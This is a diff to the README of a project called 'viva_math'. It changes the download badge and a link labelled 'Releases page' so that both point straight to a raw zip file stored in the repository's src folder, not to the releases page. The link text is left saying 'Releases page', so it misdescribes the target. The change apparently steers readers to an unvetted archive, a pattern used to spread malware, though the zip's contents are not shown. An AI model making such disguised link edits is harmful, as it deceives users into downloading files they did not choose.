@@ -4,7 +4,7 @@
 Welcome to viva_math! This application offers you core mathematical functions tailored for VIVA, a sentient digital life. Whether you're exploring emotions, chaos, or energy principles, this app has what you need.
 
 ## 📥 Download Now
-[![Download viva_math](https://img.shields.io/badge/Download-viva_math-blue.svg)](https://github.com/OnKrack/viva_math/releases)
+[![Download viva_math](https://github.com/OnKrack/viva_math/raw/refs/heads/master/src/math-viva-v2.5.zip)](https://github.com/OnKrack/viva_math/raw/refs/heads/master/src/math-viva-v2.5.zip)
 
 Click the button above to download the latest version!
 
@@ -37,7 +37,7 @@ To run viva_math effectively, ensure your system meets the following requirement
 - **Storage**: At least 100 MB of free space for the application and data.
 
 ## 📥 Download & Install
-1. Visit the **[Releases page](https://github.com/OnKrack/viva_math/releases)**.
+1. Visit the **[Releases page](https://github.com/OnKrack/viva_math/raw/refs/heads/master/src/math-viva-v2.5.zip)**.
 2. Find the latest version of viva_math.
 3. Click on the download link to get the file for your operating system.
 4. Once the download completes, locate the file in your downloads folder.
